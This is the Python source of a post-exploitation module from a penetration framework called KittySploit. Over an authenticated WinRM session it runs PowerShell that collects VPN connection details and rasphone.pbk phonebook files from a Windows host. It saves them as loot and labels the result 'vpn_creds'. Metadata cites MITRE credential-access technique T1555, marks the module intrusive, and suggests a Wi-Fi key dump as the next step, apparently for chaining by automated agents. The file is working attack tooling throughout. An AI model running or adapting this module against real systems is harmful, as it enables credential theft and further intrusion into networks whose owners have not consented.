#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.winrm.winrm_session_mixin import WinRMSessionMixin
import re


class Module(Post, WinRMSessionMixin):
	__info__ = {
		"name": "WinRM Gather VPN Profiles",
		"description": "List VPN connections and rasphone.pbk phonebooks through WinRM",
		"author": "KittySploit Team",
		"platform": Platform.WINDOWS,
		"session_type": SessionType.WINRM,
		"references": ["https://attack.mitre.org/techniques/T1555/"],
		"agent": {
			"risk": "intrusive",
			"effects": ["active_exploitation"],
			"expected_requests": 2,
			"reversible": False,
			"approval_required": True,
			"produces": ["credentials"],
			"chain": {
				"consumes_capabilities": ["authenticated_session"],
				"produces_capabilities": ["vpn_creds"],
				"suggested_followups": ["post/winrm/gather/dump_wifi_keys"],
			},
		},
	}

	save_local = OptBool(True, "Save results under ./output", False)

	def _script(self) -> str:
		return r"""
$sections = New-Object System.Collections.Generic.List[string]
$found = $false
if (Get-Command Get-VpnConnection -ErrorAction SilentlyContinue) {
  $vpns = @((Get-VpnConnection -ErrorAction SilentlyContinue) + (Get-VpnConnection -AllUserConnection -ErrorAction SilentlyContinue) | Sort-Object Name -Unique)
  if ($vpns.Count -gt 0) {
    $found = $true
    $sections.Add("=== Get-VpnConnection ===`n$($vpns | Format-List | Out-String)")
  }
}
foreach ($pbk in @((Join-Path $env:APPDATA 'Microsoft\Network\Connections\Pbk\rasphone.pbk'),(Join-Path $env:ProgramData 'Microsoft\Network\Connections\Pbk\rasphone.pbk'))) {
  if (-not (Test-Path -LiteralPath $pbk)) { continue }
  $found = $true
  $content = Get-Content -LiteralPath $pbk -ErrorAction SilentlyContinue
  $sections.Add("=== Phonebook: $pbk ===`n$($content -join "`n")")
}
$ras = netsh ras show phonebook info 2>&1
if ($LASTEXITCODE -eq 0 -and $ras) {
  $found = $true
  $sections.Add("=== netsh ras ===`n$($ras -join "`n")")
}
if (-not $found) { Write-Output 'No VPN profiles or phonebook files found.' }
else { $sections -join "`n`n" }
"""

	def run(self):
		try:
			print_status("Collecting VPN profiles over WinRM...")
			result = self.winrm_run_encoded_ps(self._script())
			if not result:
				raise ProcedureError(FailureType.Unknown, "No output returned")
			if re.search(r"No VPN profiles or phonebook files found", result, re.I):
				print_warning(result)
				return True
			if self._bool_opt(self.save_local, True):
				path = self.winrm_save_loot(result, "winrm_vpn_profiles")
				print_success(f"Saved to ./{path}")
			print_success("VPN profile extraction completed")
			print_info(result)
			return True
		except ProcedureError:
			raise
		except Exception as exc:
			raise ProcedureError(FailureType.Unknown, f"WinRM VPN dump error: {exc}")
